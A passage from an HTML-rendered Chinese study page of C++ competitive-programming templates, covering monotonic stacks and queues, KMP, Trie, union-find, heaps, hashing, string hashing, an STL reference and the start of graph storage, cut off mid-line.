队头的值</span><br>q[hh];<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-keyword">if</span> (hh != tt)<br>&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-5-单调栈"><a href="#2-5-单调栈" class="headerlink" title="2.5 单调栈"></a>2.5 单调栈</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">常见模型：找出每个数左边离它最近的比它大/小的数<br><span class="hljs-keyword">int</span> tt = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (tt &amp;&amp; check(stk[tt], i)) tt -- ;<br>    stk[ ++ tt] = i;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-6-单调队列"><a href="#2-6-单调队列" class="headerlink" title="2.6 单调队列"></a>2.6 单调队列</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">常见模型：找出滑动窗口中的最大值/最小值<br><span class="hljs-keyword">int</span> hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (hh &lt;= tt &amp;&amp; check_out(q[hh])) hh ++ ;  <span class="hljs-comment">// 判断队头是否滑出窗口</span><br>    <span class="hljs-keyword">while</span> (hh &lt;= tt &amp;&amp; check(q[tt], i)) tt -- ;<br>    q[ ++ tt] = i;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-7-KMP"><a href="#2-7-KMP" class="headerlink" title="2.7 KMP"></a>2.7 KMP</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度</span><br>求模式串的Next数组：<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>, j = <span class="hljs-number">0</span>; i &lt;= m; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];<br>    <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) j ++ ;<br>    ne[i] = j;<br>&#125;<br><br><span class="hljs-comment">// 匹配</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt;= n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];<br>    <span class="hljs-keyword">if</span> (s[i] == p[j + <span class="hljs-number">1</span>]) j ++ ;<br>    <span class="hljs-keyword">if</span> (j == m)<br>    &#123;<br>        j = ne[j];<br>        <span class="hljs-comment">// 匹配成功后的逻辑</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-8-Trie树"><a href="#2-8-Trie树" class="headerlink" title="2.8 Trie树"></a>2.8 Trie树</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> son[N][<span class="hljs-number">26</span>], cnt[N], idx;<br><span class="hljs-comment">// 0号点既是根节点，又是空节点</span><br><span class="hljs-comment">// son[][]存储树中每个节点的子节点</span><br><span class="hljs-comment">// cnt[]存储以每个节点结尾的单词数量</span><br><br><span class="hljs-comment">// 插入一个字符串</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; str[i]; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!son[p][u]) son[p][u] = ++ idx;<br>        p = son[p][u];<br>    &#125;<br>    cnt[p] ++ ;<br>&#125;<br><br><span class="hljs-comment">// 查询字符串出现的次数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; str[i]; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        p = son[p][u];<br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-9-并查集"><a href="#2-9-并查集" class="headerlink" title="2.9 并查集"></a>2.9 并查集</h3><h4 id="2-9-1-朴素并查集"><a href="#2-9-1-朴素并查集" class="headerlink" title="2.9.1 朴素并查集"></a>2.9.1 朴素并查集</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> p[N]; <span class="hljs-comment">//存储每个点的祖宗节点</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ ) p[i] = i;<br><br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>p[find(a)] = find(b);<br></code></pre></div></td></tr></table></figure><h4 id="2-9-2-维护大小size的并查集"><a href="#2-9-2-维护大小size的并查集" class="headerlink" title="2.9.2 维护大小size的并查集"></a>2.9.2 维护大小size的并查集</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> p[N], size[N];<br><span class="hljs-comment">//p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    size[i] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>size[find(b)] += size[find(a)];<br>p[find(a)] = find(b);<br></code></pre></div></td></tr></table></figure><h4 id="2-9-3-维护到祖宗节点距离的并查集"><a href="#2-9-3-维护到祖宗节点距离的并查集" class="headerlink" title="2.9.3 维护到祖宗节点距离的并查集"></a>2.9.3 维护到祖宗节点距离的并查集</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> p[N], d[N];<br><span class="hljs-comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x)<br>    &#123;<br>        <span class="hljs-keyword">int</span> u = find(p[x]);<br>        d[x] += d[p[x]];<br>        p[x] = u;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    d[i] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>p[find(a)] = find(b);<br>d[find(a)] = distance; <span class="hljs-comment">// 根据具体问题，初始化find(a)的偏移量</span><br></code></pre></div></td></tr></table></figure><h3 id="2-10-堆"><a href="#2-10-堆" class="headerlink" title="2.10 堆"></a>2.10 堆</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span><br><span class="hljs-comment">// ph[k]存储第k个插入的点在堆中的位置</span><br><span class="hljs-comment">// hp[k]存储堆中下标是k的点是第几个插入的</span><br><span class="hljs-keyword">int</span> h[N], ph[N], hp[N], size;<br><br><span class="hljs-comment">// 交换两个点，及其映射关系</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">heap_swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    swap(ph[hp[a]],ph[hp[b]]);<br>    swap(hp[a], hp[b]);<br>    swap(h[a], h[b]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> t = u;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (u != t)<br>    &#123;<br>        heap_swap(u, t);<br>        down(t);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">up</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (u / <span class="hljs-number">2</span> &amp;&amp; h[u] &lt; h[u / <span class="hljs-number">2</span>])<br>    &#123;<br>        heap_swap(u, u / <span class="hljs-number">2</span>);<br>        u &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// O(n)建堆</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n / <span class="hljs-number">2</span>; i; i -- ) down(i);<br><br></code></pre></div></td></tr></table></figure><h3 id="2-11-一般哈希"><a href="#2-11-一般哈希" class="headerlink" title="2.11 一般哈希"></a>2.11 一般哈希</h3><h4 id="2-11-1-拉链法"><a href="#2-11-1-拉链法" class="headerlink" title="2.11.1 拉链法"></a>2.11.1 拉链法</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> h[N], e[N], ne[N], idx;<br><br><span class="hljs-comment">// 向哈希表中插入一个数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> k = (x % N + N) % N;<br>    e[idx] = x;<br>    ne[idx] = h[k];<br>    h[k] = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 在哈希表中查询某个数是否存在</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> k = (x % N + N) % N;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[k]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        <span class="hljs-keyword">if</span> (e[i] == x)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="2-11-2-开放寻址法"><a href="#2-11-2-开放寻址法" class="headerlink" title="2.11.2 开放寻址法"></a>2.11.2 开放寻址法</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> h[N];<br><br><span class="hljs-comment">// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> t = (x % N + N) % N;<br>    <span class="hljs-keyword">while</span> (h[t] != null &amp;&amp; h[t] != x)<br>    &#123;<br>        t ++ ;<br>        <span class="hljs-keyword">if</span> (t == N) t = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-12-字符串哈希"><a href="#2-12-字符串哈希" class="headerlink" title="2.12 字符串哈希"></a>2.12 字符串哈希</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">核心思想：将字符串看成P进制数，P的经验值是<span class="hljs-number">131</span>或<span class="hljs-number">13331</span>，取这两个值的冲突概率低<br>小技巧：取模的数用<span class="hljs-number">2</span>^<span class="hljs-number">64</span>，这样直接用<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>存储，溢出的结果就是取模的结果<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ULL;<br>ULL h[N], p[N]; <span class="hljs-comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span><br><br><span class="hljs-comment">// 初始化</span><br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i];<br>    p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>&#125;<br><br><span class="hljs-comment">// 计算子串 str[l ~ r] 的哈希值</span><br><span class="hljs-function">ULL <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="2-13-STL简介"><a href="#2-13-STL简介" class="headerlink" title="2.13 STL简介"></a>2.13 STL简介</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>, 变长数组，倍增的思想<br>    size()  返回元素个数<br>    empty()  返回是否为空<br>    clear()  清空<br>    front()/back()<br>    push_back()/pop_back()<br>    begin()/end()<br>    []<br>    支持比较运算，按字典序<br><br><span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt;<br>    first, 第一个元素<br>    second, 第二个元素<br>    支持比较运算，以first为第一关键字，以second为第二关键字（字典序）<br><br><span class="hljs-built_in">string</span>，字符串<br>    size()/length()  返回字符串长度<br>    empty()<br>    clear()<br>    substr(起始下标，(子串长度))  返回子串<br>    c_str()  返回字符串所在字符数组的起始地址<br><br><span class="hljs-built_in">queue</span>, 队列<br>    size()<br>    empty()<br>    push()  向队尾插入一个元素<br>    front()  返回队头元素<br>    back()  返回队尾元素<br>    pop()  弹出队头元素<br><br><span class="hljs-built_in">priority_queue</span>, 优先队列，默认是大根堆<br>    size()<br>    empty()<br>    push()  插入一个元素<br>    top()  返回堆顶元素<br>    pop()  弹出堆顶元素<br>    定义成小根堆的方式：<span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;, greater&lt;<span class="hljs-keyword">int</span>&gt;&gt; q;<br><br><span class="hljs-built_in">stack</span>, 栈<br>    size()<br>    empty()<br>    push()  向栈顶插入一个元素<br>    top()  返回栈顶元素<br>    pop()  弹出栈顶元素<br><br><span class="hljs-built_in">deque</span>, 双端队列<br>    size()<br>    empty()<br>    clear()<br>    front()/back()<br>    push_back()/pop_back()<br>    push_front()/pop_front()<br>    begin()/end()<br>    []<br><br><span class="hljs-built_in">set</span>, <span class="hljs-built_in">map</span>, <span class="hljs-built_in">multiset</span>, <span class="hljs-built_in">multimap</span>, 基于平衡二叉树（红黑树），动态维护有序序列<br>    size()<br>    empty()<br>    clear()<br>    begin()/end()<br>    ++, -- 返回前驱和后继，时间复杂度 O(logn)<br><br>    <span class="hljs-built_in">set</span>/<span class="hljs-built_in">multiset</span><br>        insert()  插入一个数<br>        find()  查找一个数<br>        count()  返回某一个数的个数<br>        erase()<br>            (<span class="hljs-number">1</span>) 输入是一个数x，删除所有<span class="hljs-function">x   <span class="hljs-title">O</span><span class="hljs-params">(k + logn)</span></span><br>            (2) 输入一个迭代器，删除这个迭代器<br>        lower_bound()/upper_bound()<br>            lower_bound(x)  返回大于等于x的最小的数的迭代器<br>            upper_bound(x)  返回大于x的最小的数的迭代器<br>    <span class="hljs-built_in">map</span>/<span class="hljs-built_in">multimap</span><br>        insert()  插入的数是一个<span class="hljs-built_in">pair</span><br>        erase()  输入的参数是<span class="hljs-built_in">pair</span>或者迭代器<br>        find()<br>        []  注意<span class="hljs-built_in">multimap</span>不支持此操作。 时间复杂度是 O(logn)<br>        lower_bound()/upper_bound()<br><br><span class="hljs-built_in">unordered_set</span>, <span class="hljs-built_in">unordered_map</span>, <span class="hljs-built_in">unordered_multiset</span>, <span class="hljs-built_in">unordered_multimap</span>, 哈希表<br>    和上面类似，增删改查的时间复杂度是 O(<span class="hljs-number">1</span>)<br>    不支持 lower_bound()/upper_bound()， 迭代器的++，--<br><br><span class="hljs-built_in">bitset</span>, 圧位<br>    <span class="hljs-built_in">bitset</span>&lt;10000&gt; s;<br>    ~, &amp;, |, ^<br>    &gt;&gt;, &lt;&lt;<br>    ==, !=<br>    []<br><br>    count()  返回有多少个<span class="hljs-number">1</span><br><br>    any()  判断是否至少有一个<span class="hljs-number">1</span><br>    none()  判断是否全为<span class="hljs-number">0</span><br><br>    <span class="hljs-built_in">set</span>()  把所有位置成<span class="hljs-number">1</span><br>    <span class="hljs-built_in">set</span>(k, v)  将第k位变成v<br>    reset()  把所有位变成<span class="hljs-number">0</span><br>    flip()  等价于~<br>    flip(k) 把第k位取反<br><br></code></pre></div></td></tr></table></figure><h2 id="三-搜索与图论"><a href="#三-搜索与图论" class="headerlink" title="三.搜索与图论"></a>三.搜索与图论</h2><h3 id="3-1-树与图的存储"><a href="#3-1-树与图的存储" class="headerlink" title="3.1 树与图的存储"></a>3.1 树与图的存储</h3><p>树是一种特殊的图，与图的存储方式相同。<br>对于无向图中的边ab，存储两条有向边a-&gt;b, b-&gt;a。<br>因此我们可以只考虑有向图的存储。</p><h4 id="3-1-1-邻接矩阵："><a href="#3-1-1-邻接矩阵：" class="headerlink" title="3.1.1 邻接矩阵："></a>3.1.1 邻接矩阵：</h4><p>g[a][b] 存储边a-&gt;b</p><h4 id="3-1-2-邻接表："><a href="#3-1-2-邻接表：" class="headerlink" title="3.1.2 邻接表："></a>3.1.2 邻接表：</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点</span><br><span class="hljs-keyword">int</span> h[N], e[N], ne[N], idx;<br><br><span class="hljs-comment">// 添加一条边a-&gt;b</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 初始化</span><br>idx = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">memset</span>(h, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span> 